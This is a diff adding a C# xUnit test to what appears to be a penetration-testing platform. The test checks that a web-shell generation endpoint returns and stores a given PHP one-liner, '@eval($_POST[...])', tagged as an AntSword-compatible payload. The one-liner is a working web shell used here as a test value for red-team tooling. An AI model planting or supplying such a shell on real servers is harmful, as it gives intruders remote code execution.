@@ -163,6 +163,46 @@ public class WebShellTests
         Assert.Equal(HttpStatusCode.NotFound, foreignExec.StatusCode);
     }
 
+    [Fact]
+    public async System.Threading.Tasks.Task GenerateScript_RendersAndStores_WithoutRegistration()
+    {
+        await using var env = await TestEnv.StartAsync();
+        await AuthenticatedHost.LoginAsync(env.Http);
+        var engagementId = await CreateEngagementAsync(env.Http);
+
+        // Generation decoupled from registration: no URL anywhere, and an
+        // unsupplied adapter falls back to the in-tree family.
+        var generated = await env.Http.PostAsJsonAsync(
+            $"/engagements/{engagementId}/webshells/scripts",
+            new GenerateWebShellScriptRequest(Password: "genpass"));
+        generated.EnsureSuccessStatusCode();
+        var script = await generated.Content.ReadFromJsonAsync<ScriptDto>();
+        Assert.NotNull(script);
+        Assert.Equal("<?php @eval($_POST['genpass']); ?>", script!.Script);
+        Assert.Equal("genpass", script.Password);
+        Assert.Equal("antsword-php", script.AdapterId);
+
+        // The script landed in the payload store like any build: content,
+        // fingerprint, class -- re-downloadable under its payload id.
+        var payloads = env.Host.Services.GetRequiredService<Rod.Audit.IPayloadStore>();
+        var stored = await payloads.FindAsync(
+            Guid.Parse(script.PayloadId), Guid.Parse(engagementId));
+        Assert.NotNull(stored);
+        Assert.Equal(script.Script, Encoding.UTF8.GetString(stored!.Content));
+        Assert.Equal(script.Fingerprint, stored.Fingerprint);
+        Assert.Equal("WebShell", stored.Class);
+        Assert.Equal("php", stored.Language);
+
+        // Generation registered nothing: the endpoint roster stays empty.
+        var roster = await env.Http.GetFromJsonAsync<WebShellDto[]>(
+            $"/engagements/{engagementId}/webshells");
+        Assert.Empty(roster!);
+    }
+
+    private sealed record ScriptDto(
+        string PayloadId, string AdapterId, string ScriptLanguage,
+        string Password, string Script, string Fingerprint);
+
     private static async System.Threading.Tasks.Task<string> CreateEngagementAsync(HttpClient client)
     {
         var response = await client.PostAsJsonAsync("/engagements",
